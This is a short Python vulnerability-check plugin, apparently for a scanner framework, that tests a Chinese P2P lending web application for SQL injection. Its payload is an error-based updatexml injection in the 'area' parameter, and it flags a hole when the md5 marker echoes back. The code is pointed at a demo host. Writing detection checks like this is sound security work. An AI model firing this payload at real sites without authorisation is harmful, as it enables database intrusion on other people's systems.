#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:JianQianGui P2P SQL injection
#author: Jumbo
#ref: http://www.wooyun.org/bugs/wooyun-2010-0135528



def assign(service, arg):
    if service == "jinqiangui_p2p":
        return True, arg


def audit(arg):
    payload = "?plugins&q=areas&name=&type=p,c&area=updatexml(1,concat(0x5c,md5(1)),1)#"
    url = arg + payload
    code, head,res, errcode, _url = curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('jinqiangui_p2p', 'http://demo1.wangdaixitong.com/')[1])